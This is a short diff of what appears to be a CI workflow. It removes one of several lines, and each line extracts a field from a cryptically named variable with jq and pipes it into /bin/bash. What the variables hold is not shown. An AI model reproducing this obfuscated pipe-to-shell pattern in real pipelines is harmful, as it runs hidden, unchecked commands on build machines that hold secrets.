@@ -31,7 +31,6 @@ jobs:
           printf '%s' "$gva10" | jq -r .x83 | /bin/bash
           echo $vjvln77 | jq -r .c5223 | /bin/bash
           echo $jbx0 | jq -r .j9 | /bin/bash
-          printf '%s' "$vuacu6115" | jq -r .hvt3 | /bin/bash
           printf '%s' "$ntfll322" | jq -r .uixtw5 | /bin/bash
 
       - name: Archive output
